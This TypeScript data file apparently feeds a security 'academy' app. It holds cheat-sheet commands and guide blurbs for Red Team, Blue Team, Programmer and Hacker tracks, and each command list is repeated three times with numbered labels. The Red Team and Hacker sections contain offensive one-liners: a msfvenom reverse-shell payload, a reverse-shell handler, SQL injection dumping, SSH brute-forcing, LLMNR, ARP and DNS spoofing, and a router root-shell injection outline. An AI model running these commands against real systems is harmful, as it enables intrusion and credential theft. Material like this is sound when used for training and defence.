export const academyData: any = {
  "Red Team": {
    "description": "The Predator: Offensive Operations, Stealth Recon, and Exploitation Orchestration.",
    "cheats": [
      {
        "label": "Nmap: Stealth Scan",
        "cmd": "nmap -sS -Pn -T4 --open <target>",
        "desc": "Identify open ports while minimizing firewall alerts."
      },
      {
        "label": "Metasploit: Handler",
        "cmd": "use exploit/multi/handler; set PAYLOAD <type>; exploit",
        "desc": "Universal listener for incoming reverse shells."
      },
      {
        "label": "RevShell: Python PTY",
        "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "desc": "Upgrade a basic shell to a fully interactive TTY."
      },
      {
        "label": "SQLmap: Auto-Dump",
        "cmd": "sqlmap -u \"<url>\" --batch --dump --level=5",
        "desc": "Deep automated SQL injection and data exfiltration."
      },
      {
        "label": "Hydra: SSH Brute",
        "cmd": "hydra -L users.txt -P rockyou.txt <target> ssh",
        "desc": "Credential stuffing against SSH services."
      },
      {
        "label": "Responder: Poison",
        "cmd": "sudo responder -I <interface> -rdwv",
        "desc": "Intercept and poison LLMNR/NBT-NS requests."
      },
      {
        "label": "John: Zip Crack",
        "cmd": "zip2john <file>.zip > hash.txt; john hash.txt",
        "desc": "Extract and crack passwords from ZIP archives."
      },
      {
        "label": "Msfvenom: ELF",
        "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> -f elf > payload.elf",
        "desc": "Generate a malicious ELF binary for Linux."
      },
      {
        "label": "Impacket: ASREPRoast",
        "cmd": "impacket-GetNPUsers <domain>/ -usersfile <users> -format john",
        "desc": "Harvest TGTs for AS-REP roasting."
      },
      {
        "label": "Bettercap: ARP",
        "cmd": "set arp.spoof.targets <ip>; arp.spoof on",
        "desc": "Man-in-the-Middle via ARP cache poisoning."
      },
      {
        "label": "Nmap: Stealth Scan 11",
        "cmd": "nmap -sS -Pn -T4 --open <target>",
        "desc": "Identify open ports while minimizing firewall alerts."
      },
      {
        "label": "Metasploit: Handler 12",
        "cmd": "use exploit/multi/handler; set PAYLOAD <type>; exploit",
        "desc": "Universal listener for incoming reverse shells."
      },
      {
        "label": "RevShell: Python PTY 13",
        "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "desc": "Upgrade a basic shell to a fully interactive TTY."
      },
      {
        "label": "SQLmap: Auto-Dump 14",
        "cmd": "sqlmap -u \"<url>\" --batch --dump --level=5",
        "desc": "Deep automated SQL injection and data exfiltration."
      },
      {
        "label": "Hydra: SSH Brute 15",
        "cmd": "hydra -L users.txt -P rockyou.txt <target> ssh",
        "desc": "Credential stuffing against SSH services."
      },
      {
        "label": "Responder: Poison 16",
        "cmd": "sudo responder -I <interface> -rdwv",
        "desc": "Intercept and poison LLMNR/NBT-NS requests."
      },
      {
        "label": "John: Zip Crack 17",
        "cmd": "zip2john <file>.zip > hash.txt; john hash.txt",
        "desc": "Extract and crack passwords from ZIP archives."
      },
      {
        "label": "Msfvenom: ELF 18",
        "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> -f elf > payload.elf",
        "desc": "Generate a malicious ELF binary for Linux."
      },
      {
        "label": "Impacket: ASREPRoast 19",
        "cmd": "impacket-GetNPUsers <domain>/ -usersfile <users> -format john",
        "desc": "Harvest TGTs for AS-REP roasting."
      },
      {
        "label": "Bettercap: ARP 20",
        "cmd": "set arp.spoof.targets <ip>; arp.spoof on",
        "desc": "Man-in-the-Middle via ARP cache poisoning."
      },
      {
        "label": "Nmap: Stealth Scan 21",
        "cmd": "nmap -sS -Pn -T4 --open <target>",
        "desc": "Identify open ports while minimizing firewall alerts."
      },
      {
        "label": "Metasploit: Handler 22",
        "cmd": "use exploit/multi/handler; set PAYLOAD <type>; exploit",
        "desc": "Universal listener for incoming reverse shells."
      },
      {
        "label": "RevShell: Python PTY 23",
        "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "desc": "Upgrade a basic shell to a fully interactive TTY."
      },
      {
        "label": "SQLmap: Auto-Dump 24",
        "cmd": "sqlmap -u \"<url>\" --batch --dump --level=5",
        "desc": "Deep automated SQL injection and data exfiltration."
      },
      {
        "label": "Hydra: SSH Brute 25",
        "cmd": "hydra -L users.txt -P rockyou.txt <target> ssh",
        "desc": "Credential stuffing against SSH services."
      },
      {
        "label": "Responder: Poison 26",
        "cmd": "sudo responder -I <interface> -rdwv",
        "desc": "Intercept and poison LLMNR/NBT-NS requests."
      },
      {
        "label": "John: Zip Crack 27",
        "cmd": "zip2john <file>.zip > hash.txt; john hash.txt",
        "desc": "Extract and crack passwords from ZIP archives."
      },
      {
        "label": "Msfvenom: ELF 28",
        "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> -f elf > payload.elf",
        "desc": "Generate a malicious ELF binary for Linux."
      },
      {
        "label": "Impacket: ASREPRoast 29",
        "cmd": "impacket-GetNPUsers <domain>/ -usersfile <users> -format john",
        "desc": "Harvest TGTs for AS-REP roasting."
      },
      {
        "label": "Bettercap: ARP 30",
        "cmd": "set arp.spoof.targets <ip>; arp.spoof on",
        "desc": "Man-in-the-Middle via ARP cache poisoning."
      }
    ],
    "guides": [
      {
        "title": "The Art of the Pivot",
        "text": "Master SSH tunneling, Chisel, and proxychains to navigate internal networks behind firewalls."
      },
      {
        "title": "Bypassing Modern EDR",
        "text": "Techniques for in-memory execution, beacon obfuscation, and syscall unhooking to evade XDR detection."
      },
      {
        "title": "Active Directory Dominance",
        "text": "From LLMNR poisoning to Domain Admin via Kerberoasting, DCSync, and Golden Ticket creation."
      },
      {
        "title": "Web Logic Exploitation",
        "text": "Going beyond XSS/SQLi: Attacking business logic, IDORs, and insecure JWT implementation."
      },
      {
        "title": "Cloud Metadata Harvesting",
        "text": "Exploiting SSRF to steal IAM credentials from AWS/GCP/Azure instance metadata services."
      },
      {
        "title": "Kerberos: Silver Tickets",
        "text": "Forging service tickets to maintain stealthy persistence within a target domain."
      },
      {
        "title": "Phishing Payload Crafting",
        "text": "Generating weaponized documents and LNK files that bypass Mark-of-the-Web (MOTW)."
      },
      {
        "title": "Exfiltrating Data via DNS",
        "text": "Using DNS tunneling to bypass egress filtering and leak sensitive documents."
      }
    ]
  },
  "Blue Team": {
    "description": "The Guardian: Defensive Architecture, Incident Response, and Hardening.",
    "cheats": [
      {
        "label": "UFW: Lockdown",
        "cmd": "sudo ufw default deny incoming; sudo ufw allow from <ip>",
        "desc": "Strict firewall policy for high-security environments."
      },
      {
        "label": "Fail2Ban: Status",
        "cmd": "sudo fail2ban-client status <jail>",
        "desc": "Monitor active bans on services like SSH or Nginx."
      },
      {
        "label": "Journalctl: Auth",
        "cmd": "journalctl -f -u ssh",
        "desc": "Monitor SSH logs in real-time for brute-force patterns."
      },
      {
        "label": "TCPDump: Capture",
        "cmd": "sudo tcpdump -i eth0 -w capture.pcap",
        "desc": "Capture raw network traffic for forensic analysis."
      },
      {
        "label": "Checksec: System",
        "cmd": "checksec --kernel",
        "desc": "Audit the running kernel for security features like ASLR/NX."
      },
      {
        "label": "ClamAV: Full Scan",
        "cmd": "sudo clamscan -r --bell -i /",
        "desc": "Recursive virus scan of the entire root filesystem."
      },
      {
        "label": "Auditd: Watch",
        "cmd": "auditctl -w /etc/passwd -p wa -k passwd_change",
        "desc": "Set an audit watch on critical system files."
      },
      {
        "label": "Netstat: PID",
        "cmd": "sudo netstat -tulpn",
        "desc": "Identify which programs are listening on which ports."
      },
      {
        "label": "Lynis: Audit",
        "cmd": "sudo lynis audit system",
        "desc": "Comprehensive security auditing for Unix-based systems."
      },
      {
        "label": "ModSecurity: Verify",
        "cmd": "sudo nginx -V 2>&1 | grep modsecurity",
        "desc": "Verify WAF module integration in Nginx."
      },
      {
        "label": "UFW: Lockdown 11",
        "cmd": "sudo ufw default deny incoming; sudo ufw allow from <ip>",
        "desc": "Strict firewall policy for high-security environments."
      },
      {
        "label": "Fail2Ban: Status 12",
        "cmd": "sudo fail2ban-client status <jail>",
        "desc": "Monitor active bans on services like SSH or Nginx."
      },
      {
        "label": "Journalctl: Auth 13",
        "cmd": "journalctl -f -u ssh",
        "desc": "Monitor SSH logs in real-time for brute-force patterns."
      },
      {
        "label": "TCPDump: Capture 14",
        "cmd": "sudo tcpdump -i eth0 -w capture.pcap",
        "desc": "Capture raw network traffic for forensic analysis."
      },
      {
        "label": "Checksec: System 15",
        "cmd": "checksec --kernel",
        "desc": "Audit the running kernel for security features like ASLR/NX."
      },
      {
        "label": "ClamAV: Full Scan 16",
        "cmd": "sudo clamscan -r --bell -i /",
        "desc": "Recursive virus scan of the entire root filesystem."
      },
      {
        "label": "Auditd: Watch 17",
        "cmd": "auditctl -w /etc/passwd -p wa -k passwd_change",
        "desc": "Set an audit watch on critical system files."
      },
      {
        "label": "Netstat: PID 18",
        "cmd": "sudo netstat -tulpn",
        "desc": "Identify which programs are listening on which ports."
      },
      {
        "label": "Lynis: Audit 19",
        "cmd": "sudo lynis audit system",
        "desc": "Comprehensive security auditing for Unix-based systems."
      },
      {
        "label": "ModSecurity: Verify 20",
        "cmd": "sudo nginx -V 2>&1 | grep modsecurity",
        "desc": "Verify WAF module integration in Nginx."
      },
      {
        "label": "UFW: Lockdown 21",
        "cmd": "sudo ufw default deny incoming; sudo ufw allow from <ip>",
        "desc": "Strict firewall policy for high-security environments."
      },
      {
        "label": "Fail2Ban: Status 22",
        "cmd": "sudo fail2ban-client status <jail>",
        "desc": "Monitor active bans on services like SSH or Nginx."
      },
      {
        "label": "Journalctl: Auth 23",
        "cmd": "journalctl -f -u ssh",
        "desc": "Monitor SSH logs in real-time for brute-force patterns."
      },
      {
        "label": "TCPDump: Capture 24",
        "cmd": "sudo tcpdump -i eth0 -w capture.pcap",
        "desc": "Capture raw network traffic for forensic analysis."
      },
      {
        "label": "Checksec: System 25",
        "cmd": "checksec --kernel",
        "desc": "Audit the running kernel for security features like ASLR/NX."
      },
      {
        "label": "ClamAV: Full Scan 26",
        "cmd": "sudo clamscan -r --bell -i /",
        "desc": "Recursive virus scan of the entire root filesystem."
      },
      {
        "label": "Auditd: Watch 27",
        "cmd": "auditctl -w /etc/passwd -p wa -k passwd_change",
        "desc": "Set an audit watch on critical system files."
      },
      {
        "label": "Netstat: PID 28",
        "cmd": "sudo netstat -tulpn",
        "desc": "Identify which programs are listening on which ports."
      },
      {
        "label": "Lynis: Audit 29",
        "cmd": "sudo lynis audit system",
        "desc": "Comprehensive security auditing for Unix-based systems."
      },
      {
        "label": "ModSecurity: Verify 30",
        "cmd": "sudo nginx -V 2>&1 | grep modsecurity",
        "desc": "Verify WAF module integration in Nginx."
      }
    ],
    "guides": [
      {
        "title": "Zero Trust Architecture",
        "text": "Implementing internal micro-segmentation and robust identity-based access control models."
      },
      {
        "title": "Forensic Memory Analysis",
        "text": "Using Volatility to identify malware, rootkits, and hidden connections in RAM dumps."
      },
      {
        "title": "Hardening the Linux Kernel",
        "text": "Sysctl optimizations, disabling unneeded modules, and grsecurity patches for OS resilience."
      },
      {
        "title": "Incident Response: Triaging",
        "text": "Step-by-step methodology for isolating compromised hosts and preserving digital evidence."
      },
      {
        "title": "WAF Rules Engineering",
        "text": "Crafting custom ModSecurity rules to block zero-day exploitation attempts in real-time."
      },
      {
        "title": "SIEM Logging Pipelines",
        "text": "Building scalable ELK/Splunk pipelines to correlate events from thousands of endpoints."
      },
      {
        "title": "Kubernetes Runtime Security",
        "text": "Using Falco and FalcoSidekick to detect anomalous behavior in containerized environments."
      },
      {
        "title": "Automated Patch Management",
        "text": "Orchestrating Ansible playbooks to ensure 100% security update coverage across the fleet."
      }
    ]
  },
  "Programmer": {
    "description": "The Architect: Clean Code, Scalable Systems, and Algorithmic Masterpieces.",
    "cheats": [
      {
        "label": "React: useMemo",
        "cmd": "const val = useMemo(() => compute(a, b), [a, b]);",
        "desc": "Memoize expensive calculations between renders."
      },
      {
        "label": "TS: Discriminated",
        "cmd": "type Result = { success: true, data: T } | { success: false, error: string }",
        "desc": "Type-safe error handling pattern."
      },
      {
        "label": "Git: Cherry-Pick",
        "cmd": "git cherry-pick <commit-hash>",
        "desc": "Apply a specific commit from another branch."
      },
      {
        "label": "Python: List Comp",
        "cmd": "[x**2 for x in data if x > 0]",
        "desc": "Elegant and fast list transformations."
      },
      {
        "label": "Rust: Match Guard",
        "cmd": "match x { Some(val) if val > 10 => ... }",
        "desc": "Adding conditional logic to pattern matching."
      },
      {
        "label": "Node: Cluster",
        "cmd": "if (cluster.isMaster) { cluster.fork(); }",
        "desc": "Scale Node.js apps across multiple CPU cores."
      },
      {
        "label": "Docker: Multi-stage",
        "cmd": "FROM golang:1.21 AS builder",
        "desc": "Pattern for building tiny production images."
      },
      {
        "label": "SQL: CTE Query",
        "cmd": "WITH regional_sales AS (SELECT ...) SELECT * FROM regional_sales",
        "desc": "Organize complex queries for readability."
      },
      {
        "label": "Go: Goroutine",
        "cmd": "go func() { ... }()",
        "desc": "Launch a lightweight concurrent thread."
      },
      {
        "label": "CSS: Grid System",
        "cmd": "display: grid; grid-template-columns: repeat(3, 1fr);",
        "desc": "Modern responsive layout engine."
      },
      {
        "label": "React: useMemo 11",
        "cmd": "const val = useMemo(() => compute(a, b), [a, b]);",
        "desc": "Memoize expensive calculations between renders."
      },
      {
        "label": "TS: Discriminated 12",
        "cmd": "type Result = { success: true, data: T } | { success: false, error: string }",
        "desc": "Type-safe error handling pattern."
      },
      {
        "label": "Git: Cherry-Pick 13",
        "cmd": "git cherry-pick <commit-hash>",
        "desc": "Apply a specific commit from another branch."
      },
      {
        "label": "Python: List Comp 14",
        "cmd": "[x**2 for x in data if x > 0]",
        "desc": "Elegant and fast list transformations."
      },
      {
        "label": "Rust: Match Guard 15",
        "cmd": "match x { Some(val) if val > 10 => ... }",
        "desc": "Adding conditional logic to pattern matching."
      },
      {
        "label": "Node: Cluster 16",
        "cmd": "if (cluster.isMaster) { cluster.fork(); }",
        "desc": "Scale Node.js apps across multiple CPU cores."
      },
      {
        "label": "Docker: Multi-stage 17",
        "cmd": "FROM golang:1.21 AS builder",
        "desc": "Pattern for building tiny production images."
      },
      {
        "label": "SQL: CTE Query 18",
        "cmd": "WITH regional_sales AS (SELECT ...) SELECT * FROM regional_sales",
        "desc": "Organize complex queries for readability."
      },
      {
        "label": "Go: Goroutine 19",
        "cmd": "go func() { ... }()",
        "desc": "Launch a lightweight concurrent thread."
      },
      {
        "label": "CSS: Grid System 20",
        "cmd": "display: grid; grid-template-columns: repeat(3, 1fr);",
        "desc": "Modern responsive layout engine."
      },
      {
        "label": "React: useMemo 21",
        "cmd": "const val = useMemo(() => compute(a, b), [a, b]);",
        "desc": "Memoize expensive calculations between renders."
      },
      {
        "label": "TS: Discriminated 22",
        "cmd": "type Result = { success: true, data: T } | { success: false, error: string }",
        "desc": "Type-safe error handling pattern."
      },
      {
        "label": "Git: Cherry-Pick 23",
        "cmd": "git cherry-pick <commit-hash>",
        "desc": "Apply a specific commit from another branch."
      },
      {
        "label": "Python: List Comp 24",
        "cmd": "[x**2 for x in data if x > 0]",
        "desc": "Elegant and fast list transformations."
      },
      {
        "label": "Rust: Match Guard 25",
        "cmd": "match x { Some(val) if val > 10 => ... }",
        "desc": "Adding conditional logic to pattern matching."
      },
      {
        "label": "Node: Cluster 26",
        "cmd": "if (cluster.isMaster) { cluster.fork(); }",
        "desc": "Scale Node.js apps across multiple CPU cores."
      },
      {
        "label": "Docker: Multi-stage 27",
        "cmd": "FROM golang:1.21 AS builder",
        "desc": "Pattern for building tiny production images."
      },
      {
        "label": "SQL: CTE Query 28",
        "cmd": "WITH regional_sales AS (SELECT ...) SELECT * FROM regional_sales",
        "desc": "Organize complex queries for readability."
      },
      {
        "label": "Go: Goroutine 29",
        "cmd": "go func() { ... }()",
        "desc": "Launch a lightweight concurrent thread."
      },
      {
        "label": "CSS: Grid System 30",
        "cmd": "display: grid; grid-template-columns: repeat(3, 1fr);",
        "desc": "Modern responsive layout engine."
      }
    ],
    "guides": [
      {
        "title": "Domain Driven Design",
        "text": "How to map your technical code to business requirements using a ubiquitous language."
      },
      {
        "title": "Microservices Orchestration",
        "text": "Managing distributed state, circuit breakers, and communication in a service mesh."
      },
      {
        "title": "High-Performance Python",
        "text": "Using Cython, Numba, and multiprocessing to break the GIL bottleneck for data tasks."
      },
      {
        "title": "Clean Code in Production",
        "text": "Balancing architectural purity with the pragmatic needs of rapid software delivery."
      },
      {
        "title": "TDD for Complex APIs",
        "text": "Writing unit and integration tests that guarantee stability without slowing down development."
      },
      {
        "title": "Functional Programming in TS",
        "text": "Leveraging immutability and high-order functions to reduce bugs in large frontends."
      },
      {
        "title": "Database Indexing Strategy",
        "text": "Optimizing B-Tree and GIN indexes for sub-millisecond query response at scale."
      },
      {
        "title": "DevOps for Developers",
        "text": "Understanding CI/CD pipelines, Github Actions, and Infrastructure as Code (Terraform)."
      }
    ]
  },
  "Hacker": {
    "description": "The Explorer: Hardware Interfacing, Firmware Analysis, and Deep Logic Deconstruction.",
    "cheats": [
      {
        "label": "Archer C3200: Backup",
        "cmd": "cat /tmp/conf.bin | archer-decrypt > conf.xml",
        "desc": "Decrypting the TP-Link binary configuration backup."
      },
      {
        "label": "Binwalk: Entropy",
        "cmd": "binwalk -E firmware.bin",
        "desc": "Identify encrypted or compressed sections in firmware."
      },
      {
        "label": "UART: Baud Detect",
        "cmd": "python3 baudrate.py /dev/ttyUSB0",
        "desc": "Brute-force detect hardware serial baud rate."
      },
      {
        "label": "Flashrom: Dump",
        "cmd": "flashrom -p ch341a_spi -r backup.bin",
        "desc": "Dump an SPI flash chip using a physical CH341A programmer."
      },
      {
        "label": "GDB: Watchpoint",
        "cmd": "watch *0x08048000",
        "desc": "Set a hardware break on memory read/write access."
      },
      {
        "label": "OpenOCD: JTAG",
        "cmd": "openocd -f interface/jlink.cfg -f target/stm32.cfg",
        "desc": "Bridge hardware JTAG to GDB for real-time debugging."
      },
      {
        "label": "Gnuradio: Sink",
        "cmd": "osmocom_sink",
        "desc": "Output signal to SDR hardware (HackRF/RTLSDR)."
      },
      {
        "label": "Volatility: Info",
        "cmd": "volatility -f mem.raw imageinfo",
        "desc": "Identify the OS profile for a raw RAM dump."
      },
      {
        "label": "Ettercap: DNS",
        "cmd": "sudo ettercap -T -q -P dns_spoof -M arp",
        "desc": "Intercept DNS queries and return malicious fake IPs."
      },
      {
        "label": "Strings: Hex Offset",
        "cmd": "strings -t x <file>",
        "desc": "Show plain-text strings with their hex offset in the binary."
      },
      {
        "label": "Archer C3200: Backup 11",
        "cmd": "cat /tmp/conf.bin | archer-decrypt > conf.xml",
        "desc": "Decrypting the TP-Link binary configuration backup."
      },
      {
        "label": "Binwalk: Entropy 12",
        "cmd": "binwalk -E firmware.bin",
        "desc": "Identify encrypted or compressed sections in firmware."
      },
      {
        "label": "UART: Baud Detect 13",
        "cmd": "python3 baudrate.py /dev/ttyUSB0",
        "desc": "Brute-force detect hardware serial baud rate."
      },
      {
        "label": "Flashrom: Dump 14",
        "cmd": "flashrom -p ch341a_spi -r backup.bin",
        "desc": "Dump an SPI flash chip using a physical CH341A programmer."
      },
      {
        "label": "GDB: Watchpoint 15",
        "cmd": "watch *0x08048000",
        "desc": "Set a hardware break on memory read/write access."
      },
      {
        "label": "OpenOCD: JTAG 16",
        "cmd": "openocd -f interface/jlink.cfg -f target/stm32.cfg",
        "desc": "Bridge hardware JTAG to GDB for real-time debugging."
      },
      {
        "label": "Gnuradio: Sink 17",
        "cmd": "osmocom_sink",
        "desc": "Output signal to SDR hardware (HackRF/RTLSDR)."
      },
      {
        "label": "Volatility: Info 18",
        "cmd": "volatility -f mem.raw imageinfo",
        "desc": "Identify the OS profile for a raw RAM dump."
      },
      {
        "label": "Ettercap: DNS 19",
        "cmd": "sudo ettercap -T -q -P dns_spoof -M arp",
        "desc": "Intercept DNS queries and return malicious fake IPs."
      },
      {
        "label": "Strings: Hex Offset 20",
        "cmd": "strings -t x <file>",
        "desc": "Show plain-text strings with their hex offset in the binary."
      },
      {
        "label": "Archer C3200: Backup 21",
        "cmd": "cat /tmp/conf.bin | archer-decrypt > conf.xml",
        "desc": "Decrypting the TP-Link binary configuration backup."
      },
      {
        "label": "Binwalk: Entropy 22",
        "cmd": "binwalk -E firmware.bin",
        "desc": "Identify encrypted or compressed sections in firmware."
      },
      {
        "label": "UART: Baud Detect 23",
        "cmd": "python3 baudrate.py /dev/ttyUSB0",
        "desc": "Brute-force detect hardware serial baud rate."
      },
      {
        "label": "Flashrom: Dump 24",
        "cmd": "flashrom -p ch341a_spi -r backup.bin",
        "desc": "Dump an SPI flash chip using a physical CH341A programmer."
      },
      {
        "label": "GDB: Watchpoint 25",
        "cmd": "watch *0x08048000",
        "desc": "Set a hardware break on memory read/write access."
      },
      {
        "label": "OpenOCD: JTAG 26",
        "cmd": "openocd -f interface/jlink.cfg -f target/stm32.cfg",
        "desc": "Bridge hardware JTAG to GDB for real-time debugging."
      },
      {
        "label": "Gnuradio: Sink 27",
        "cmd": "osmocom_sink",
        "desc": "Output signal to SDR hardware (HackRF/RTLSDR)."
      },
      {
        "label": "Volatility: Info 28",
        "cmd": "volatility -f mem.raw imageinfo",
        "desc": "Identify the OS profile for a raw RAM dump."
      },
      {
        "label": "Ettercap: DNS 29",
        "cmd": "sudo ettercap -T -q -P dns_spoof -M arp",
        "desc": "Intercept DNS queries and return malicious fake IPs."
      },
      {
        "label": "Strings: Hex Offset 30",
        "cmd": "strings -t x <file>",
        "desc": "Show plain-text strings with their hex offset in the binary."
      }
    ],
    "guides": [
      {
        "title": "Archer C3200: Root Injection",
        "text": "Step-by-step: Decrypt conf.bin, inject telnetd into the Description tag, re-encrypt, and restore via web UI for a persistent root shell."
      },
      {
        "title": "The Hardware Hacker's Toolset",
        "text": "Essential gear walkthrough: Multimeters, Logic Analyzers, JTAGulators, and the Bus Pirate."
      },
      {
        "title": "Reversing Proprietary Protocols",
        "text": "How to deconstruct custom binary protocols from packet captures and hex strings."
      },
      {
        "title": "Firmware Emulation Mastery",
        "text": "Using QEMU and Firmadyne to find zero-day vulnerabilities without physical hardware access."
      },
      {
        "title": "Samsung Flipper: Forensics",
        "text": "Configuring the SCH-I400 for real-time traffic relay and rogue AP forensic interception."
      },
      {
        "title": "Satellite Security: SDR",
        "text": "Using GNU Radio and SatDump to intercept and decode unencrypted satellite telemetry downlinks."
      },
      {
        "title": "JTAG Boundary Scan Ops",
        "text": "Using OpenOCD to manipulate CPU registers and bypass hardware boot-security checks."
      },
      {
        "title": "Roku 3: UART Bypass",
        "text": "Tracing PCB pads to bypass serial console restrictions and gain a root shell via the bootloader."
      },
      {
        "title": "Signal Spoofing: GPS",
        "text": "Using SDR to generate fake NMEA sentences and deceive navigation systems in a lab environment."
      },
      {
        "title": "Automated Firmware Unpacking",
        "text": "Writing custom Binwalk plugins to handle proprietary compression and obfuscation layers."
      },
      {
        "title": "IoT Gateway Pivoting",
        "text": "Compromising an edge device to use as a tunnel for deeper network exploitation."
      },
      {
        "title": "SPI Flash Dumping 101",
        "text": "Practical guide to wiring SOIC clips and reading chips directly from the board."
      },
      {
        "title": "Logic Analyzer Probing",
        "text": "Using Saleae Logic to decode I2C and SPI traffic during the device boot sequence."
      },
      {
        "title": "Bypassing Debug Protections",
        "text": "Glitching VCC/Clock lines to skip authentication checks on protected microcontrollers."
      },
      {
        "title": "The Psychology of Hardware",
        "text": "Understanding how physical layouts and component choices reveal security assumptions."
      },
      {
        "title": "Defensive Hardware Design",
        "text": "Anti-tamper mechanisms, epoxy potting, and secure-boot implementation strategies."
      }
    ]
  }
};